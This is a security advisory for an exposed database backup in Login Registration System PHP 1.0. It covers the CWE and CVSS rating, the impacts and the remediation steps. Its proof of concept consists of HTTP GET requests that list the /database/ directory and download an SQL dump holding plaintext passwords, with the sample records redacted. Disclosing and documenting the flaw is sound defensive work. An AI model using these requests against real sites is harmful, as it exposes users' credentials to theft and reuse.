
# Sensitive Database Backup Disclosure in Login Registration System PHP 1.0

## Affected Product Details

* **Product:** Login Registration System In PHP
* **Version:** 1.0
* **Vendor:** https://code-projects.org/login-registration-system-in-php-with-source-code/
* **Affected Resource:** `/database/login_registration_system.sql`
* **Authentication Required:** No
* **Attack Vector:** Remote
* **Vulnerability Type:** Sensitive Information Disclosure / Exposed Database Backup
* **CWE-200:** Exposure of Sensitive Information to an Unauthorized Actor
* **Related CWE-548:** Exposure of Information Through Directory Listing
* **CVSS v3.1 Score:** 7.5 (High)
* **CVSS v3.1 Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

## Description

A vulnerability was discovered in Login Registration System PHP 1.0 distributed through code-projects.org.

The application exposes a publicly accessible database backup file through a web-accessible directory. An unauthenticated attacker can access and download the SQL dump without authorization.

The exposed database dump contains user information including names, email addresses and plaintext passwords.

## Proof of Concept

### Directory Listing

```http
GET /loginsystem/database/ HTTP/1.1
Host: TARGET
```

Response:

```html
Index of /loginsystem/database

login_registration_system.sql
```

### Database Backup Disclosure

```http
GET /loginsystem/database/login_registration_system.sql HTTP/1.1
Host: TARGET
```

Response contains:

```sql
INSERT INTO `users`
(`user_id`,`user_first_name`,`user_last_name`,
`user_email`,`user_password`)
VALUES (...);
```

Example records (redacted):

```sql
INSERT INTO `users`
(`user_id`,`user_first_name`,`user_last_name`,
`user_email`,`user_password`)
VALUES
(3,'[REDACTED]','[REDACTED]','[REDACTED]','[REDACTED]'),
(4,'[REDACTED]','[REDACTED]','[REDACTED]','[REDACTED]');
```

## Impact

An unauthenticated remote attacker can:

* Download the application database backup
* Obtain user information
* Obtain email addresses
* Obtain plaintext passwords
* Enumerate valid accounts
* Perform credential reuse attacks
* Gain insight into internal database structure

The vulnerability results in complete disclosure of stored user credentials and sensitive application data.

## Remediation

* Remove SQL backup files from web-accessible directories.
* Disable directory listing on the web server.
* Store backups outside the document root.
* Hash passwords using strong password hashing algorithms such as:

```php
$passwordHash = password_hash($password, PASSWORD_DEFAULT);
```

* Restrict direct access to backup and configuration files.

## References

* https://owasp.org/www-community/vulnerabilities/Information_exposure_through_directory_listing
* https://cwe.mitre.org/data/definitions/200.html
* https://cwe.mitre.org/data/definitions/548.html
* https://code-projects.org/login-registration-system-in-php-with-source-code/
